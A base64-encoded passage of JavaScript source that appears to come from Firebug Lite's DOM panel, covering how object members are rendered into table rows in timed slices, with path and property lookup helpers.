5oYXNPd25Qcm9wZXJ0eShuYW1lKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRvZ2dsZXMgPSB0b2dnbGVzW25hbWVdOw0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB0b2dnbGVzID0gdG9nZ2xlc1tuYW1lXSA9IHt9Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdmFyIHZhbHVlID0gcm93Lmxhc3RDaGlsZC5maXJzdENoaWxkLnJlcE9iamVjdDsNCiAgICAgICAgICAgIHZhciBtZW1iZXJzID0gZ2V0TWVtYmVycyh2YWx1ZSwgbGV2ZWwrMSk7DQoNCiAgICAgICAgICAgIHZhciByb3dUYWcgPSB0aGlzLnJvd1RhZzsNCiAgICAgICAgICAgIHZhciBsYXN0Um93ID0gcm93Ow0KDQogICAgICAgICAgICB2YXIgZGVsYXkgPSAwOw0KICAgICAgICAgICAgLy92YXIgc2V0U2l6ZSA9IG1lbWJlcnMubGVuZ3RoOw0KICAgICAgICAgICAgLy92YXIgcm93Q291bnQgPSAxOw0KICAgICAgICAgICAgd2hpbGUgKG1lbWJlcnMubGVuZ3RoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHdpdGgoe3NsaWNlOiBtZW1iZXJzLnNwbGljZSgwLCBpbnNlcnRTbGljZVNpemUpLCBpc0xhc3Q6ICFtZW1iZXJzLmxlbmd0aH0pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGxhc3RSb3cucGFyZW50Tm9kZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gcm93VGFnLmluc2VydFJvd3Moe21lbWJlcnM6IHNsaWNlfSwgbGFzdFJvdyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFJvdyA9IHJlc3VsdFsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbk1lbWJlclJvd1NsaWNlQWRkZWQnLCBbbnVsbCwgcmVzdWx0LCByb3dDb3VudCwgc2V0U2l6ZV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vcm93Q291bnQgKz0gaW5zZXJ0U2xpY2VTaXplOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzTGFzdCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3cucmVtb3ZlQXR0cmlidXRlKCJpbnNlcnRUaW1lb3V0Iik7DQogICAgICAgICAgICAgICAgICAgIH0sIGRlbGF5KTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBkZWxheSArPSBpbnNlcnRJbnRlcnZhbDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcm93Lmluc2VydFRpbWVvdXQgPSBkZWxheTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuRE9NQmFzZVBhbmVsID0gZnVuY3Rpb24oKSB7fTsNCg0KRmlyZWJ1Zy5ET01CYXNlUGFuZWwucHJvdG90eXBlID0gZXh0ZW5kKEZpcmVidWcuUGFuZWwsDQp7DQogICAgdGFnOiBEaXJUYWJsZVBsYXRlLnRhYmxlVGFnLA0KDQogICAgZ2V0UmVhbE9iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgLy8gVE9ETzogTW92ZSB0aGlzIHRvIHNvbWUgZ2xvYmFsIGxvY2F0aW9uDQogICAgICAgIC8vIFRPRE86IFVud3JhcHBpbmcgc2hvdWxkIGJlIGNlbnRyYWxpemVkIHJhdGhlciB0aGFuIHNwcmlua2xpbmcgaXQgYXJvdW5kIGFkIGhvYy4NCiAgICAgICAgLy8gVE9ETzogV2UgbWlnaHQgYmUgYWJsZSB0byBtYWtlIHRoaXMgY2hlY2sgbW9yZSBhdXRob3JpdGF0aXZlIHdpdGggUXVlcnlJbnRlcmZhY2UuDQogICAgICAgIGlmICghb2JqZWN0KSByZXR1cm4gb2JqZWN0Ow0KICAgICAgICBpZiAob2JqZWN0LndyYXBwZWRKU09iamVjdCkgcmV0dXJuIG9iamVjdC53cmFwcGVkSlNPYmplY3Q7DQogICAgICAgIHJldHVybiBvYmplY3Q7DQogICAgfSwNCg0KICAgIHJlYnVpbGQ6IGZ1bmN0aW9uKHVwZGF0ZSwgc2Nyb2xsVG9wKQ0KICAgIHsNCiAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25CZWZvcmVEb21VcGRhdGVTZWxlY3Rpb24nLCBbdGhpc10pOw0KICAgICAgICB2YXIgbWVtYmVycyA9IGdldE1lbWJlcnModGhpcy5zZWxlY3Rpb24pOw0KICAgICAgICBleHBhbmRNZW1iZXJzKG1lbWJlcnMsIHRoaXMudG9nZ2xlcywgMCwgMCk7DQoNCiAgICAgICAgdGhpcy5zaG93TWVtYmVycyhtZW1iZXJzLCB1cGRhdGUsIHNjcm9sbFRvcCk7DQogICAgICAgIA0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvIHN0YXR1c2Jhcg0KICAgICAgICBpZiAoIXRoaXMucGFyZW50UGFuZWwpDQogICAgICAgICAgICB1cGRhdGVTdGF0dXNCYXIodGhpcyk7DQogICAgfSwNCg0KICAgIHNob3dNZW1iZXJzOiBmdW5jdGlvbihtZW1iZXJzLCB1cGRhdGUsIHNjcm9sbFRvcCkNCiAgICB7DQogICAgICAgIC8vIElmIHdlIGFyZSBzdGlsbCBpbiB0aGUgbWlkc3Qgb2YgaW5zZXJ0aW5nIHJvd3MsIGNhbmNlbCBhbGwgcGVuZGluZw0KICAgICAgICAvLyBpbnNlcnRpb25zIGhlcmUgLSB0aGlzIGlzIGEgYmlnIHNwZWVkdXAgd2hlbiBzdGVwcGluZyBpbiB0aGUgZGVidWdnZXINCiAgICAgICAgaWYgKHRoaXMudGltZW91dHMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy50aW1lb3V0cy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICB0aGlzLmNvbnRleHQuY2xlYXJUaW1lb3V0KHRoaXMudGltZW91dHNbaV0pOw0KICAgICAgICAgICAgZGVsZXRlIHRoaXMudGltZW91dHM7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoIW1lbWJlcnMubGVuZ3RoKQ0KICAgICAgICAgICAgcmV0dXJuIHRoaXMuc2hvd0VtcHR5TWVtYmVycygpOw0KDQogICAgICAgIHZhciBwYW5lbE5vZGUgPSB0aGlzLnBhbmVsTm9kZTsNCiAgICAgICAgdmFyIHByaW9yU2Nyb2xsVG9wID0gc2Nyb2xsVG9wID09IHVuZGVmaW5lZCA/IHBhbmVsTm9kZS5zY3JvbGxUb3AgOiBzY3JvbGxUb3A7DQoNCiAgICAgICAgLy8gSWYgd2UgYXJlIGFza2VkIHRvICJ1cGRhdGUiIHRoZSBjdXJyZW50IHZpZXcsIHRoZW4gYnVpbGQgdGhlIG5ldyB0YWJsZQ0KICAgICAgICAvLyBvZmZzY3JlZW4gYW5kIHN3YXAgaXQgaW4gd2hlbiBpdCdzIGRvbmUNCiAgICAgICAgdmFyIG9mZnNjcmVlbiA9IHVwZGF0ZSAmJiBwYW5lbE5vZGUuZmlyc3RDaGlsZDsNCiAgICAgICAgdmFyIGRlc3QgPSBvZmZzY3JlZW4gPyBwYW5lbE5vZGUub3duZXJEb2N1bWVudCA6IHBhbmVsTm9kZTsNCg0KICAgICAgICB2YXIgdGFibGUgPSB0aGlzLnRhZy5yZXBsYWNlKHtkb21QYW5lbDogdGhpcywgdG9nZ2xlczogdGhpcy50b2dnbGVzfSwgZGVzdCk7DQogICAgICAgIHZhciB0Ym9keSA9IHRhYmxlLmxhc3RDaGlsZDsNCiAgICAgICAgdmFyIHJvd1RhZyA9IERpclRhYmxlUGxhdGUucm93VGFnOw0KDQogICAgICAgIC8vIEluc2VydCB0aGUgZmlyc3Qgc2xpY2UgaW1tZWRpYXRlbHkNCiAgICAgICAgLy92YXIgc2xpY2UgPSBtZW1iZXJzLnNwbGljZSgwLCBpbnNlcnRTbGljZVNpemUpOw0KICAgICAgICAvL3ZhciByZXN1bHQgPSByb3dUYWcuaW5zZXJ0Um93cyh7bWVtYmVyczogc2xpY2V9LCB0Ym9keS5sYXN0Q2hpbGQpOw0KICAgICAgICANCiAgICAgICAgLy92YXIgc2V0U2l6ZSA9IG1lbWJlcnMubGVuZ3RoOw0KICAgICAgICAvL3ZhciByb3dDb3VudCA9IDE7DQogICAgICAgIA0KICAgICAgICB2YXIgcGFuZWwgPSB0aGlzOw0KICAgICAgICB2YXIgcmVzdWx0Ow0KICAgICAgICANCiAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25NZW1iZXJSb3dTbGljZUFkZGVkJywgW3BhbmVsLCByZXN1bHQsIHJvd0NvdW50LCBzZXRTaXplXSk7DQogICAgICAgIHZhciB0aW1lb3V0cyA9IFtdOw0KICAgICAgICANCiAgICAgICAgdmFyIGRlbGF5ID0gMDsNCiAgICAgICAgDQogICAgICAgIC8vIGVuYWJsZSB0byBtZWFzdXJlIHJlbmRlcmluZyBwZXJmb3JtYW5jZQ0KICAgICAgICB2YXIgcmVuZGVyU3RhcnQgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsNCiAgICAgICAgd2hpbGUgKG1lbWJlcnMubGVuZ3RoKQ0KICAgICAgICB7DQogICAgICAgICAgICB3aXRoKHtzbGljZTogbWVtYmVycy5zcGxpY2UoMCwgaW5zZXJ0U2xpY2VTaXplKSwgaXNMYXN0OiAhbWVtYmVycy5sZW5ndGh9KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRpbWVvdXRzLnB1c2godGhpcy5jb250ZXh0LnNldFRpbWVvdXQoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gY2FuIHRoaXMgYmUgYSB0aW1pbmcgZXJyb3IgcmVsYXRlZCB0byB0aGUNCiAgICAgICAgICAgICAgICAgICAgLy8gIml0ZXJhdGlvbiBudW1iZXIiIGFwcHJvYWNoIGluc3RlZCBvZiAiZHVyYXRpb24gdGltZSI/DQogICAgICAgICAgICAgICAgICAgIC8vIGF2b2lkIGVycm9yIGluIElFOA0KICAgICAgICAgICAgICAgICAgICBpZiAoIXRib2R5Lmxhc3RDaGlsZCkgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gcm93VGFnLmluc2VydFJvd3Moe21lbWJlcnM6IHNsaWNlfSwgdGJvZHkubGFzdENoaWxkKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vcm93Q291bnQgKz0gaW5zZXJ0U2xpY2VTaXplOw0KICAgICAgICAgICAgICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbk1lbWJlclJvd1NsaWNlQWRkZWQnLCBbcGFuZWwsIHJlc3VsdCwgcm93Q291bnQsIHNldFNpemVdKTsNCiAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKChwYW5lbE5vZGUuc2Nyb2xsSGVpZ2h0K3BhbmVsTm9kZS5vZmZzZXRIZWlnaHQpID49IHByaW9yU2Nyb2xsVG9wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGFuZWxOb2RlLnNjcm9sbFRvcCA9IHByaW9yU2Nyb2xsVG9wOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vIGVuYWJsZSB0byBtZWFzdXJlIHJlbmRlcmluZyBwZXJmb3JtYW5jZQ0KICAgICAgICAgICAgICAgICAgICAvL2lmIChpc0xhc3QpIGFsZXJ0KG5ldyBEYXRlKCkuZ2V0VGltZSgpIC0gcmVuZGVyU3RhcnQgKyAibXMiKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0sIGRlbGF5KSk7DQogICAgDQogICAgICAgICAgICAgICAgZGVsYXkgKz0gaW5zZXJ0SW50ZXJ2YWw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAob2Zmc2NyZWVuKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aW1lb3V0cy5wdXNoKHRoaXMuY29udGV4dC5zZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocGFuZWxOb2RlLmZpcnN0Q2hpbGQpDQogICAgICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5yZXBsYWNlQ2hpbGQodGFibGUsIHBhbmVsTm9kZS5maXJzdENoaWxkKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5hcHBlbmRDaGlsZCh0YWJsZSk7DQoNCiAgICAgICAgICAgICAgICAvLyBTY3JvbGwgYmFjayB0byB3aGVyZSB3ZSB3ZXJlIGJlZm9yZQ0KICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5zY3JvbGxUb3AgPSBwcmlvclNjcm9sbFRvcDsNCiAgICAgICAgICAgIH0sIGRlbGF5KSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB0aW1lb3V0cy5wdXNoKHRoaXMuY29udGV4dC5zZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwYW5lbE5vZGUuc2Nyb2xsVG9wID0gc2Nyb2xsVG9wID09IHVuZGVmaW5lZCA/IDAgOiBzY3JvbGxUb3A7DQogICAgICAgICAgICB9LCBkZWxheSkpOw0KICAgICAgICB9DQogICAgICAgIHRoaXMudGltZW91dHMgPSB0aW1lb3V0czsNCiAgICB9LA0KDQogICAgLyoNCiAgICAvLyBuZXcNCiAgICBzaG93TWVtYmVyczogZnVuY3Rpb24obWVtYmVycywgdXBkYXRlLCBzY3JvbGxUb3ApDQogICAgew0KICAgICAgICAvLyBJZiB3ZSBhcmUgc3RpbGwgaW4gdGhlIG1pZHN0IG9mIGluc2VydGluZyByb3dzLCBjYW5jZWwgYWxsIHBlbmRpbmcNCiAgICAgICAgLy8gaW5zZXJ0aW9ucyBoZXJlIC0gdGhpcyBpcyBhIGJpZyBzcGVlZHVwIHdoZW4gc3RlcHBpbmcgaW4gdGhlIGRlYnVnZ2VyDQogICAgICAgIGlmICh0aGlzLnRpbWVvdXRzKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMudGltZW91dHMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICAgICAgdGhpcy5jb250ZXh0LmNsZWFyVGltZW91dCh0aGlzLnRpbWVvdXRzW2ldKTsNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLnRpbWVvdXRzOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCFtZW1iZXJzLmxlbmd0aCkNCiAgICAgICAgICAgIHJldHVybiB0aGlzLnNob3dFbXB0eU1lbWJlcnMoKTsNCg0KICAgICAgICB2YXIgcGFuZWxOb2RlID0gdGhpcy5wYW5lbE5vZGU7DQogICAgICAgIHZhciBwcmlvclNjcm9sbFRvcCA9IHNjcm9sbFRvcCA9PSB1bmRlZmluZWQgPyBwYW5lbE5vZGUuc2Nyb2xsVG9wIDogc2Nyb2xsVG9wOw0KDQogICAgICAgIC8vIElmIHdlIGFyZSBhc2tlZCB0byAidXBkYXRlIiB0aGUgY3VycmVudCB2aWV3LCB0aGVuIGJ1aWxkIHRoZSBuZXcgdGFibGUNCiAgICAgICAgLy8gb2Zmc2NyZWVuIGFuZCBzd2FwIGl0IGluIHdoZW4gaXQncyBkb25lDQogICAgICAgIHZhciBvZmZzY3JlZW4gPSB1cGRhdGUgJiYgcGFuZWxOb2RlLmZpcnN0Q2hpbGQ7DQogICAgICAgIHZhciBkZXN0ID0gb2Zmc2NyZWVuID8gcGFuZWxOb2RlLm93bmVyRG9jdW1lbnQgOiBwYW5lbE5vZGU7DQoNCiAgICAgICAgdmFyIHRhYmxlID0gdGhpcy50YWcucmVwbGFjZSh7ZG9tUGFuZWw6IHRoaXMsIHRvZ2dsZXM6IHRoaXMudG9nZ2xlc30sIGRlc3QpOw0KICAgICAgICB2YXIgdGJvZHkgPSB0YWJsZS5sYXN0Q2hpbGQ7DQogICAgICAgIHZhciByb3dUYWcgPSBEaXJUYWJsZVBsYXRlLnJvd1RhZzsNCg0KICAgICAgICAvLyBJbnNlcnQgdGhlIGZpcnN0IHNsaWNlIGltbWVkaWF0ZWx5DQogICAgICAgIC8vdmFyIHNsaWNlID0gbWVtYmVycy5zcGxpY2UoMCwgaW5zZXJ0U2xpY2VTaXplKTsNCiAgICAgICAgLy92YXIgcmVzdWx0ID0gcm93VGFnLmluc2VydFJvd3Moe21lbWJlcnM6IHNsaWNlfSwgdGJvZHkubGFzdENoaWxkKTsNCiAgICAgICAgDQogICAgICAgIC8vdmFyIHNldFNpemUgPSBtZW1iZXJzLmxlbmd0aDsNCiAgICAgICAgLy92YXIgcm93Q291bnQgPSAxOw0KICAgICAgICANCiAgICAgICAgdmFyIHBhbmVsID0gdGhpczsNCiAgICAgICAgdmFyIHJlc3VsdDsNCiAgICAgICAgDQogICAgICAgIC8vZGlzcGF0Y2goW0ZpcmVidWcuQTExeU1vZGVsXSwgJ29uTWVtYmVyUm93U2xpY2VBZGRlZCcsIFtwYW5lbCwgcmVzdWx0LCByb3dDb3VudCwgc2V0U2l6ZV0pOw0KICAgICAgICB2YXIgdGltZW91dHMgPSBbXTsNCiAgICAgICAgDQogICAgICAgIHZhciBkZWxheSA9IDA7DQogICAgICAgIHZhciBfaW5zZXJ0U2xpY2VTaXplID0gaW5zZXJ0U2xpY2VTaXplOw0KICAgICAgICB2YXIgX2luc2VydEludGVydmFsID0gaW5zZXJ0SW50ZXJ2YWw7DQoNCiAgICAgICAgLy8gZW5hYmxlIHRvIG1lYXN1cmUgcmVuZGVyaW5nIHBlcmZvcm1hbmNlDQogICAgICAgIHZhciByZW5kZXJTdGFydCA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KICAgICAgICB2YXIgbGFzdFNraXAgPSByZW5kZXJTdGFydCwgbm93Ow0KICAgICAgICANCiAgICAgICAgd2hpbGUgKG1lbWJlcnMubGVuZ3RoKQ0KICAgICAgICB7DQogICAgICAgICAgICB3aXRoKHtzbGljZTogbWVtYmVycy5zcGxpY2UoMCwgX2luc2VydFNsaWNlU2l6ZSksIGlzTGFzdDogIW1lbWJlcnMubGVuZ3RofSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgX3Rib2R5ID0gdGJvZHk7DQogICAgICAgICAgICAgICAgdmFyIF9yb3dUYWcgPSByb3dUYWc7DQogICAgICAgICAgICAgICAgdmFyIF9wYW5lbE5vZGUgPSBwYW5lbE5vZGU7DQogICAgICAgICAgICAgICAgdmFyIF9wcmlvclNjcm9sbFRvcCA9IHByaW9yU2Nyb2xsVG9wOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRpbWVvdXRzLnB1c2godGhpcy5jb250ZXh0LnNldFRpbWVvdXQoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gY2FuIHRoaXMgYmUgYSB0aW1pbmcgZXJyb3IgcmVsYXRlZCB0byB0aGUNCiAgICAgICAgICAgICAgICAgICAgLy8gIml0ZXJhdGlvbiBudW1iZXIiIGFwcHJvYWNoIGluc3RlZCBvZiAiZHVyYXRpb24gdGltZSI/DQogICAgICAgICAgICAgICAgICAgIC8vIGF2b2lkIGVycm9yIGluIElFOA0KICAgICAgICAgICAgICAgICAgICBpZiAoIV90Ym9keS5sYXN0Q2hpbGQpIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IF9yb3dUYWcuaW5zZXJ0Um93cyh7bWVtYmVyczogc2xpY2V9LCBfdGJvZHkubGFzdENoaWxkKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vcm93Q291bnQgKz0gX2luc2VydFNsaWNlU2l6ZTsNCiAgICAgICAgICAgICAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25NZW1iZXJSb3dTbGljZUFkZGVkJywgW3BhbmVsLCByZXN1bHQsIHJvd0NvdW50LCBzZXRTaXplXSk7DQogICAgDQogICAgICAgICAgICAgICAgICAgIGlmICgoX3BhbmVsTm9kZS5zY3JvbGxIZWlnaHQgKyBfcGFuZWxOb2RlLm9mZnNldEhlaWdodCkgPj0gX3ByaW9yU2Nyb2xsVG9wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgX3BhbmVsTm9kZS5zY3JvbGxUb3AgPSBfcHJpb3JTY3JvbGxUb3A7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgLy8gZW5hYmxlIHRvIG1lYXN1cmUgcmVuZGVyaW5nIHBlcmZvcm1hbmNlDQogICAgICAgICAgICAgICAgICAgIC8vYWxlcnQoImdhcDogIiArIChuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIGxhc3RTa2lwKSk7IA0KICAgICAgICAgICAgICAgICAgICAvL2xhc3RTa2lwID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAvL2lmIChpc0xhc3QpIGFsZXJ0KCJuZXc6ICIgKyAobmV3IERhdGUoKS5nZXRUaW1lKCkgLSByZW5kZXJTdGFydCkgKyAibXMiKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfSwgZGVsYXkpKTsNCiAgICANCiAgICAgICAgICAgICAgICBkZWxheSArPSBfaW5zZXJ0SW50ZXJ2YWw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAob2Zmc2NyZWVuKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aW1lb3V0cy5wdXNoKHRoaXMuY29udGV4dC5zZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocGFuZWxOb2RlLmZpcnN0Q2hpbGQpDQogICAgICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5yZXBsYWNlQ2hpbGQodGFibGUsIHBhbmVsTm9kZS5maXJzdENoaWxkKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5hcHBlbmRDaGlsZCh0YWJsZSk7DQoNCiAgICAgICAgICAgICAgICAvLyBTY3JvbGwgYmFjayB0byB3aGVyZSB3ZSB3ZXJlIGJlZm9yZQ0KICAgICAgICAgICAgICAgIHBhbmVsTm9kZS5zY3JvbGxUb3AgPSBwcmlvclNjcm9sbFRvcDsNCiAgICAgICAgICAgIH0sIGRlbGF5KSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB0aW1lb3V0cy5wdXNoKHRoaXMuY29udGV4dC5zZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwYW5lbE5vZGUuc2Nyb2xsVG9wID0gc2Nyb2xsVG9wID09IHVuZGVmaW5lZCA/IDAgOiBzY3JvbGxUb3A7DQogICAgICAgICAgICB9LCBkZWxheSkpOw0KICAgICAgICB9DQogICAgICAgIHRoaXMudGltZW91dHMgPSB0aW1lb3V0czsNCiAgICB9LA0KICAgIC8qKi8NCiAgICANCiAgICBzaG93RW1wdHlNZW1iZXJzOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnUmVwcy5XYXJuaW5nLnRhZy5yZXBsYWNlKHtvYmplY3Q6ICJOb01lbWJlcnNXYXJuaW5nIn0sIHRoaXMucGFuZWxOb2RlKTsNCiAgICB9LA0KDQogICAgZmluZFBhdGhPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHZhciBwYXRoSW5kZXggPSAtMTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLm9iamVjdFBhdGgubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIElFIG5lZWRzID09PSBpbnN0ZWFkIG9mID09IG9yIG90aGVyd2lzZSBzb21lIG9iamVjdHMgd2lsbA0KICAgICAgICAgICAgLy8gYmUgY29uc2lkZXJlZCBlcXVhbCB0byBkaWZmZXJlbnQgb2JqZWN0cywgcmV0dXJuaW5nIHRoZQ0KICAgICAgICAgICAgLy8gd3JvbmcgaW5kZXggb2YgdGhlIG9iamVjdFBhdGggYXJyYXkNCiAgICAgICAgICAgIGlmICh0aGlzLmdldFBhdGhPYmplY3QoaSkgPT09IG9iamVjdCkNCiAgICAgICAgICAgICAgICByZXR1cm4gaTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAtMTsNCiAgICB9LA0KDQogICAgZ2V0UGF0aE9iamVjdDogZnVuY3Rpb24oaW5kZXgpDQogICAgew0KICAgICAgICB2YXIgb2JqZWN0ID0gdGhpcy5vYmplY3RQYXRoW2luZGV4XTsNCiAgICAgICAgDQogICAgICAgIGlmIChvYmplY3QgaW5zdGFuY2VvZiBQcm9wZXJ0eSkNCiAgICAgICAgICAgIHJldHVybiBvYmplY3QuZ2V0T2JqZWN0KCk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiBvYmplY3Q7DQogICAgfSwNCg0KICAgIGdldFJvd09iamVjdDogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgdmFyIG9iamVjdCA9IGdldFJvd093bmVyT2JqZWN0KHJvdyk7DQogICAgICAgIHJldHVybiBvYmplY3QgPyBvYmplY3QgOiB0aGlzLnNlbGVjdGlvbjsNCiAgICB9LA0KDQogICAgZ2V0Um93UHJvcGVydHlWYWx1ZTogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgdmFyIG9iamVjdCA9IHRoaXMuZ2V0Um93T2JqZWN0KHJvdyk7DQogICAgICAgIG9iamVjdCA9IHRoaXMuZ2V0UmVhbE9iamVjdChvYmplY3QpOw0KICAgICAgICBpZiAob2JqZWN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcHJvcE5hbWUgPSBnZXRSb3dOYW1lKHJvdyk7DQoNCiAgICAgICAgICAgIGlmIChvYmplY3QgaW5zdGFuY2VvZiBqc2RJU3RhY2tGcmFtZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gRmlyZWJ1Zy5EZWJ1Z2dlci5ldmFsdWF0ZShwcm9wTmFtZSwgdGhpcy5jb250ZXh0KTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gb2JqZWN0W3Byb3BOYW1lXTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgLyoNCiAgICBjb3B5UHJvcGVydHk6IGZ1bmN0aW9uKHJvdykNCiAgICB7DQogICAgICAgIHZhciB2YWx1ZSA9IHRoaXMuZ2V0Um93UHJvcGVydHlWYWx1ZShyb3cpOw0KICAgICAgICBjb3B5VG9DbGlwYm9hcmQodmFsdWUpOw0KICAgIH0sDQoNCiAgICBlZGl0UHJvcGVydHk6IGZ1bmN0aW9uKHJvdywgZWRpdFZhbHVlKQ0KICAgIHsNCiAgICAgICAgaWYgKGhhc0NsYXNzKHJvdywgIndhdGNoTmV3Um93IikpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh0aGlzLmNvbnRleHQuc3RvcHBlZCkNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkVkaXRvci5zdGFydEVkaXRpbmcocm93LCAiIik7DQogICAgICAgICAgICBlbHNlIGlmIChGaXJlYnVnLkNvbnNvbGUuaXNBbHdheXNFbmFibGVkKCkpICAvLyBub3Qgc3RvcHBlZCBpbiBkZWJ1Z2dlciwgbmVlZCBjb21tYW5kIGxpbmUNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRmlyZWJ1Zy5Db21tYW5kTGluZS5vbkNvbW1hbmRMaW5lRm9jdXMoKSkNCiAgICAgICAgICAgICAgICAgICAgRmlyZWJ1Zy5FZGl0b3Iuc3RhcnRFZGl0aW5nKHJvdywgIiIpOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgcm93LmlubmVyS